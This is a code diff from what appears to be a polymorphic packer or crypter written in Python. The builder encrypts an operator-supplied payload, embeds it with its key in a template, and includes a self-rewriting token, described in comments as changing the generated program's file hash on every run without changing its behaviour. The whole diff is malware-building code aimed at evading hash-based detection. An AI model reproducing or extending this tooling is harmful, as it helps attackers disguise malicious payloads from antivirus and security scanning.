@@ -29,11 +29,6 @@ from .common import KEY_SIZE, NONCE_SIZE
 from .embedding import build_executable
 from .polymorphic_template import TEMPLATE
 
-# The name of the variable that holds the self-modification token in the
-# generated source. Its value changes on every run, which changes the file
-# hash without changing the program's behaviour.
-MUTATION_VARIABLE = "MUTATION_TOKEN"
-
 
 def _load_payload(payload_arg: str) -> bytes:
     """Read the payload from the file the operator supplied."""
@@ -72,8 +67,10 @@ def _build_source(payload: bytes) -> str:
 
     ciphertext = _encrypt(key, nonce, payload)
 
+    # The initial token value. At run time the generated program rewrites this
+    # with a fresh random token on every run (see the template), so its hash
+    # keeps changing indefinitely.
     mutation_token = secrets.token_hex(16)
-    new_mutation_token = secrets.token_hex(16)
 
     source = TEMPLATE
     source = source.replace(
@@ -86,14 +83,6 @@ def _build_source(payload: bytes) -> str:
         "{payload_key}", base64.b64encode(key).decode("ascii"), 1
     )
     source = source.replace("{mutation_token}", mutation_token, 1)
-    source = source.replace(
-        "{old_mutation_line}", repr(f'{MUTATION_VARIABLE} = "{mutation_token}"'), 1
-    )
-    source = source.replace(
-        "{new_mutation_line}",
-        repr(f'{MUTATION_VARIABLE} = "{new_mutation_token}"'),
-        1,
-    )
 
     return source
 
